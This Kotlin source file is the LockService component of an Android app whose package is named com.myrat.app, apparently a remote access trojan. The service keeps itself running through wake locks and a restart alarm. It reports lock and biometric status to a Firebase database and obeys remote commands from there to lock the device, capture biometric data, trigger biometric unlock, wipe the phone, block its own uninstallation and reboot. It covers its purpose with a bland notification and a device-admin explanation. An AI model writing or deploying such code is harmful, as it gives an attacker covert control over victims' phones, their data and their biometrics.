package com.myrat.app.service

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.utils.Logger
import java.util.concurrent.Executor

class LockService : Service() {
    private lateinit var deviceId: String
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager
    private lateinit var adminComponent: ComponentName
    private lateinit var executor: Executor
    private lateinit var db: com.google.firebase.database.DatabaseReference
    private var biometricReceiver: BroadcastReceiver? = null
    private var deviceAdviceListener: ValueEventListener? = null
    private var lastCommandTime = 0L
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "LockServiceChannel"
        private const val COMMAND_DEBOUNCE_MS = 500L
    }

    override fun onCreate() {
        super.onCreate()
        try {
            // Acquire wake lock to keep service running
            acquireWakeLock()
            
            startForeground(NOTIFICATION_ID, buildNotification())

            if (!isNetworkAvailable()) {
                Logger.error("No network available, but continuing LockService for offline commands")
            }

            try {
                db = Firebase.database.getReference()
                Logger.log("Firebase initialized successfully in LockService")
            } catch (e: Exception) {
                Logger.error("Firebase initialization failed, will retry", e)
                // Continue without Firebase for now, will retry later
            }

            deviceId = try {
                MainActivity.getDeviceId(this) ?: run {
                    Logger.error("Device ID is null, using fallback ID")
                    Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device_${System.currentTimeMillis()}"
                }
            } catch (e: Exception) {
                Logger.error("Failed to get deviceId, using fallback", e)
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device_${System.currentTimeMillis()}"
            }

            Logger.log("LockService started for deviceId: $deviceId")

            // Initialize system services with proper error handling
            initializeSystemServices()
            
            setupBiometricResultReceiver()
            
            // Set up Firebase connection status
            setupFirebaseConnection()
            
            fetchAndUploadLockDetails()
            listenForDeviceAdviceCommands()
            
            // Schedule periodic restart
            schedulePeriodicRestart()
            
        } catch (e: Exception) {
            Logger.error("LockService failed to start", e)
            // Don't stop service, try to continue with limited functionality
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LockService:KeepAlive"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
            Logger.log("Wake lock acquired for LockService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock", e)
        }
    }

    private fun schedulePeriodicRestart() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, LockService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            // Schedule restart every 5 minutes
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 5 * 60 * 1000,
                5 * 60 * 1000,
                pendingIntent
            )
            Logger.log("Scheduled periodic restart for LockService")
        } catch (e: Exception) {
            Logger.error("Failed to schedule periodic restart", e)
        }
    }

    private fun initializeSystemServices() {
        try {
            devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: run {
                Logger.error("DevicePolicyManager unavailable")
                throw IllegalStateException("DevicePolicyManager unavailable")
            }
            keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: run {
                Logger.error("KeyguardManager unavailable")
                throw IllegalStateException("KeyguardManager unavailable")
            }
            powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: run {
                Logger.error("PowerManager unavailable")
                throw IllegalStateException("PowerManager unavailable")
            }
            adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            executor = ContextCompat.getMainExecutor(this)
            Logger.log("System services initialized successfully")
        } catch (e: Exception) {
            Logger.error("Failed to initialize system services", e)
            throw e
        }
    }

    private fun setupFirebaseConnection() {
        try {
            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_service").child("connected")
                    .setValue(true)
                    .addOnSuccessListener {
                        Logger.log("Firebase connection status updated")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to set connected status in LockService", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error setting up Firebase connection", e)
        }
    }

    private fun buildNotification(): Notification {
        val channelId = CHANNEL_ID
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    channelId,
                    "Lock Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                val manager = getSystemService(NotificationManager::class.java)
                manager?.createNotificationChannel(channel)
            }
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Device Lock Service")
                .setContentText("Monitoring device lock commands")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build notification in LockService", e)
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Lock Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        return try {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            Logger.error("Network check failed", e)
            false
        }
    }

    private fun fetchAndUploadLockDetails() {
        try {
            val lockDetails = mapOf(
                "isDeviceSecure" to keyguardManager.isDeviceSecure,
                "biometricStatus" to getBiometricStatus(),
                "biometricType" to getBiometricType(),
                "isDeviceAdminActive" to devicePolicyManager.isAdminActive(adminComponent),
                "lastUpdated" to System.currentTimeMillis(),
                "androidVersion" to Build.VERSION.SDK_INT,
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL
            )
            
            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
                    .addOnSuccessListener {
                        Logger.log("Lock details uploaded successfully")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload lock details: ${e.message}")
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error fetching lock details", e)
        }
    }

    private fun getBiometricStatus(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                when (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
                    androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Enrolled"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Hardware Unavailable"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_SECURITY_UPDATE_REQUIRED -> "Security Update Required"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_UNSUPPORTED -> "Unsupported"
                    androidx.biometric.BiometricManager.BIOMETRIC_STATUS_UNKNOWN -> "Unknown"
                    else -> "Unknown"
                }
            } catch (e: Exception) {
                Logger.error("Error getting biometric status", e)
                "Error"
            }
        } else {
            "Not Available"
        }
    }

    private fun getBiometricType(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    "Fingerprint/Face"
                } else {
                    "None"
                }
            } catch (e: Exception) {
                Logger.error("Error getting biometric type", e)
                "Error"
            }
        } else {
            "None"
        }
    }

    private fun listenForDeviceAdviceCommands() {
        try {
            if (!::db.isInitialized) {
                Logger.error("Database not initialized, cannot listen for commands")
                return
            }
            
            deviceAdviceListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        Logger.log("RTDB snapshot received for device advice")
                        if (!snapshot.exists()) {
                            Logger.log("No data in device advice snapshot")
                            return
                        }
                        
                        val data = snapshot.getValue(DeviceAdviceCommand::class.java) ?: run {
                            Logger.error("Failed to deserialize DeviceAdviceCommand")
                            return
                        }
                        
                        if (data.status != "pending") {
                            Logger.log("Ignoring non-pending command: ${data.action}")
                            return
                        }
                        
                        if (System.currentTimeMillis() - lastCommandTime < COMMAND_DEBOUNCE_MS) {
                            Logger.log("Command ignored due to debounce: ${data.action}")
                            return
                        }
                        
                        lastCommandTime = System.currentTimeMillis()
                        Logger.log("Processing lock command: ${data.action}")
                        
                        // Process command in background thread to avoid blocking
                        Thread {
                            processCommand(data)
                        }.start()
                        
                    } catch (e: Exception) {
                        Logger.error("Error processing RTDB command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Error listening for commands: ${error.message}")
                }
            }
            db.child("Device").child(deviceId).child("deviceAdvice")
                .addValueEventListener(deviceAdviceListener!!)
        } catch (e: Exception) {
            Logger.error("Failed to set up command listener", e)
        }
    }

    private fun processCommand(command: DeviceAdviceCommand) {
        try {
            when (command.action) {
                "lock" -> lockDevice(command)
                "unlock" -> notifyUserToUnlock(command)
                "screenOn" -> turnScreenOn(command)
                "screenOff" -> turnScreenOff(command)
                "CaptureBiometricData" -> captureBiometricData(command)
                "BiometricUnlock" -> biometricUnlock(command)
                "wipeThePhone" -> wipeThePhone(command)
                "preventUninstall" -> preventUninstall(command)
                "reboot" -> rebootDevice(command)
                "enableAdmin" -> enableDeviceAdmin(command)
                else -> {
                    Logger.error("Unknown command: ${command.action}")
                    updateCommandStatus(command, "failed", "Unknown command: ${command.action}")
                }
            }
        } catch (e: Exception) {
            Logger.error("Error processing command: ${command.action}", e)
            updateCommandStatus(command, "error", "Processing error: ${e.message}")
        }
    }

    private fun lockDevice(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
                Logger.log("Device locked successfully")
            } else {
                Logger.error("Device admin not active for lockDevice")
                updateCommandStatus(command, "failed", "Device admin not active")
                // Try to prompt for device admin
                promptForDeviceAdmin()
            }
        } catch (e: Exception) {
            Logger.error("Lock device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun notifyUserToUnlock(command: DeviceAdviceCommand) {
        try {
            if (keyguardManager.isDeviceLocked) {
                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for user unlock")
            } else {
                updateCommandStatus(command, "success", "Device already unlocked")
            }
        } catch (e: Exception) {
            Logger.error("Failed to notify user to unlock", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun turnScreenOn(command: DeviceAdviceCommand) {
        try {
            if (!powerManager.isInteractive) {
                val wakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "LockService:ScreenOn"
                )
                wakeLock.acquire(3000) // 3 seconds
                
                // For Android 15+ compatibility
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.VANILLA_ICE_CREAM) {
                    // Use newer API if available
                    try {
                        val displayManager = getSystemService(Context.DISPLAY_SERVICE) as android.hardware.display.DisplayManager
                        // Additional screen on logic for newer Android versions
                    } catch (e: Exception) {
                        Logger.error("Failed to use newer display API", e)
                    }
                }
                
                wakeLock.release()
                updateCommandStatus(command, "success", null)
                Logger.log("Screen turned on successfully")
            } else {
                updateCommandStatus(command, "success", "Screen already on")
            }
        } catch (e: Exception) {
            Logger.error("Turn screen on failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun turnScreenOff(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
                Logger.log("Screen turned off successfully")
            } else {
                Logger.error("Device admin not active for screenOff")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
            }
        } catch (e: Exception) {
            Logger.error("Turn screen off failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun captureBiometricData(command: DeviceAdviceCommand) {
        try {
            val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
            updateCommandStatus(command, "pending", "Waiting for biometric data capture")
        } catch (e: Exception) {
            Logger.error("Capture biometric data failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun biometricUnlock(command: DeviceAdviceCommand) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && hasBiometricPermission()) {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) != androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    updateCommandStatus(command, "failed", "Biometric authentication not available or enrolled")
                    return
                }

                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for biometric unlock")
            } else {
                updateCommandStatus(command, "failed", "Biometric authentication not supported or permission denied")
            }
        } catch (e: Exception) {
            Logger.error("Biometric unlock failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun wipeThePhone(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                // Add confirmation delay for safety
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                        updateCommandStatus(command, "success", null)
                        Logger.log("Device wipe initiated")
                    } catch (e: Exception) {
                        Logger.error("Device wipe execution failed", e)
                        updateCommandStatus(command, "error", "Wipe execution failed: ${e.message}")
                    }
                }, 5000) // 5 second delay
                updateCommandStatus(command, "pending", "Device wipe scheduled in 5 seconds")
            } else {
                Logger.error("Device admin not active for wipeThePhone")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
            }
        } catch (e: Exception) {
            Logger.error("Wipe device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun preventUninstall(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                updateCommandStatus(command, "success", null)
                Logger.log("Uninstall prevention enabled")
            } else {
                Logger.error("Device admin not active for preventUninstall")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
            }
        } catch (e: Exception) {
            Logger.error("Prevent uninstall failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun rebootDevice(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    devicePolicyManager.reboot(adminComponent)
                    updateCommandStatus(command, "success", null)
                    Logger.log("Device reboot initiated")
                } else {
                    updateCommandStatus(command, "failed", "Reboot not supported on this Android version")
                }
            } else {
                Logger.error("Device admin not active for reboot")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
            }
        } catch (e: Exception) {
            Logger.error("Reboot device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun enableDeviceAdmin(command: DeviceAdviceCommand) {
        try {
            promptForDeviceAdmin()
            updateCommandStatus(command, "pending", "Device admin prompt shown")
        } catch (e: Exception) {
            Logger.error("Enable device admin failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun promptForDeviceAdmin() {
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This permission is required to allow the app to lock the device and manage screen settings.")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            Logger.log("Device admin prompt shown")
        } catch (e: Exception) {
            Logger.error("Failed to show device admin prompt", e)
        }
    }

    private fun updateCommandStatus(command: DeviceAdviceCommand, status: String, error: String?) {
        try {
            if (!::db.isInitialized) {
                Logger.error("Database not initialized, cannot update command status")
                return
            }
            
            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            error?.let { updates["error"] = it }
            
            db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated command status: ${command.action} -> $status")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update command status: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Failed to update command status", e)
        }
    }

    private fun setupBiometricResultReceiver() {
        try {
            biometricReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    try {
                        val commandId = intent?.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID) ?: run {
                            Logger.error("Biometric result missing commandId")
                            return
                        }
                        val result = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_RESULT) ?: run {
                            Logger.error("Biometric result missing result")
                            return
                        }
                        val action = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION) ?: run {
                            Logger.error("Biometric result missing action")
                            return
                        }
                        val error = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ERROR)
                        Logger.log("Received biometric result: commandId=$commandId, result=$result, action=$action")
                        val command = DeviceAdviceCommand(action = action, commandId = commandId, status = result, error = error)
                        updateCommandStatus(command, result, error)
                    } catch (e: Exception) {
                        Logger.error("Failed to process biometric result", e)
                    }
                }
            }
            
            val filter = IntentFilter(com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_RESULT)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(biometricReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(biometricReceiver, filter)
            }
            Logger.log("Biometric result receiver registered")
        } catch (e: Exception) {
            Logger.error("Failed to register biometric result receiver", e)
        }
    }

    private fun hasBiometricPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.log("LockService onStartCommand")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake lock
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            
            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_service").child("connected").setValue(false)
                deviceAdviceListener?.let { db.child("Device").child(deviceId).child("deviceAdvice").removeEventListener(it) }
            }
            biometricReceiver?.let { unregisterReceiver(it) }
            Logger.log("LockService destroyed and listeners removed")
        } catch (e: Exception) {
            Logger.error("Error during LockService cleanup", e)
        }
    }

    data class DeviceAdviceCommand(
        val action: String = "",
        val commandId: String = "",
        val status: String = "",
        val timestamp: Long = 0,
        val error: String? = null
    )
}